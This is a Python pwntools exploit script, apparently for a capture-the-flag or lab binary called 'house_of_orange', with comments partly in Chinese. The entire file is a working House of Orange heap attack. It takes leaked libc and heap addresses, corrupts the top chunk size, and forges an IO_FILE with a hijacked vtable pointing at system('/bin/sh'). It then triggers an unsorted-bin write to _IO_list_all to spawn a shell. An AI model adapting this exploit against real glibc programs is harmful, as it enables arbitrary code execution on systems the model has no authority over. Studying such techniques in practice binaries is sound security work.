#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("house_of_orange")
libc = elf.libc

gs = '''
set breakpoint pending on
break _IO_flush_all_lockp
enable breakpoints once 1
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Select the "malloc (small)" option.
def small_malloc():
    io.send(b"1")
    io.recvuntil(b"> ")

# Select the "malloc (large)" option.
def large_malloc():
    io.sendthen(b"> ", b"2")

# Select the "edit (1st small chunk)" option; send data.
def edit(data):
    io.send(b"3")
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil(b"heap @ ")
heap = int(io.recvline(), 16)
print("libc.address: " + hex(libc.address))
print("heap: " + hex(heap))
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================
#----- 修改Top Chunk得到一个Free chunk
small_malloc()
gdb.attach(io)

edit(b"Y"*0x18 + p64(0x1000-0x20+0x1))
large_malloc()

pause()

#-----伪造IO_FILE劫持vtable
payload = b"a"*0x10
flag = b'/bin/sh\x00'

fake_size = p64(0x61)
fd = p64(0)
print('libc.sym._IO_list_all ',hex(libc.sym._IO_list_all))
bk = p64(libc.sym._IO_list_all - 0x10)
write_base = p64(1)
write_ptr = p64(2)
mode = p32(0)
vtable = p64(heap + 0xd8)                                                                                                                             
overflow = p64(libc.sym.system)

payload = payload + flag
payload = payload + fake_size
payload = payload + fd
payload = payload + bk
payload = payload + write_base
payload = payload + write_ptr
payload = payload + p64(0)*18
payload = payload + mode + p32(0) + p64(0) + overflow
payload = payload + vtable

edit(payload)
pause()
#-----触发操作让unsortedbin被sort
small_malloc()
# =============================================================================

io.interactive()
